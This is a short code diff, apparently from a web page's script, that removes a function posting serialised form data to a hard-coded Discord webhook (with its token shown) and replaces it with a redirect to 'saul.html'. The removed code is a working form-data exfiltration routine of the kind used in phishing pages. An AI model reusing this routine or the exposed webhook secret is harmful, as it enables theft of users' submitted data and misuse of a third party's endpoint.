@@ -9,15 +9,8 @@ document.getElementsByTagName('head')[0].appendChild(script);
    
     sendMessage( $('form').serialize() )
   }
-  function sendMessage(message) {
-    var request = new XMLHttpRequest();
-    request.open("POST", "https://discord.com/api/webhooks/1074761634033176636/lbAefsrEGySPzlIR3fW08bw65GZNSl5Pllk_VHoy48kDts8UlAW2-nkleGZA2SSoEvw-");
+  function sendMessage() {
 
-    request.setRequestHeader('Content-type', 'application/json');
+    window.location.replace("saul.html");
 
-    var params = {
-      content: message
-    }
-
-    request.send(JSON.stringify(params));
   }
